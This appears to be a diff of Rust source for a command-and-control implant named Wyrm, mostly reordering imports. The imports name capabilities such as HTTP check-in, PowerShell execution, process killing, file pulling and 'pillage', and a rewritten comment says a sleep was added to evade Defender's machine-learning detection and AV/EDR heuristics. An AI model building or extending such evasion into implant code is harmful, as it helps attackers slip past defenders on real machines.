@@ -6,16 +6,15 @@ use std::{
     time::Duration,
 };
 
-use rand::{rng, Rng};
+use rand::{Rng, rng};
 use serde::Serialize;
 use shared::{
     net::{CommandHeader, CompletedTasks},
     pretty_print::print_failed,
-    tasks::{tasks_contains_kill_agent, Command, FirstRunData, Task, WyrmResult},
+    tasks::{Command, FirstRunData, Task, WyrmResult, tasks_contains_kill_agent},
 };
 use str_crypter::{decrypt_string, sc};
 use windows_sys::{
-    core::{PCWSTR, PWSTR},
     Win32::{
         Foundation::{GetLastError, MAX_PATH},
         NetworkManagement::NetManagement::UNLEN,
@@ -26,15 +25,16 @@ use windows_sys::{
             WindowsProgramming::{GetComputerNameW, GetUserNameW, MAX_COMPUTERNAME_LENGTH},
         },
     },
+    core::{PCWSTR, PWSTR},
 };
 
 use crate::{
     comms::comms_http_check_in,
     native::{
-        accounts::{get_logged_in_username, get_process_integrity_level, ProcessIntegrityLevel},
+        accounts::{ProcessIntegrityLevel, get_logged_in_username, get_process_integrity_level},
         filesystem::{
-            change_directory, dir_listing, drop_file_to_disk, move_or_copy_file, pillage,
-            pull_file, MoveCopyAction,
+            MoveCopyAction, change_directory, dir_listing, drop_file_to_disk, move_or_copy_file,
+            pillage, pull_file,
         },
         processes::{kill_process, running_process_details},
         shell::run_powershell,
@@ -388,7 +388,10 @@ impl Wyrm {
                 buf.len() as u32,
             );
 
-            // Some aAnti-wacatac
+            // NOTE: I forgot I left this in (whilst trying some things out to get rid of defenders ML wacatac detections)
+            // however, I dont think I hate it? I', gonna keep this sleep in for now, though, I think it is kinda pointless. I can review
+            // in the future whether this does anything meaningful in terms of some runtime heuristic evasion. My gut says no, as the previous
+            // checks (from the profile) should go some way as to defeating AV/EDR - sleeps can be very easily ignored by detection solutions.
             sleep(Duration::from_secs(3));
 
             // In the event of an error, we will just send "unknown" to the server
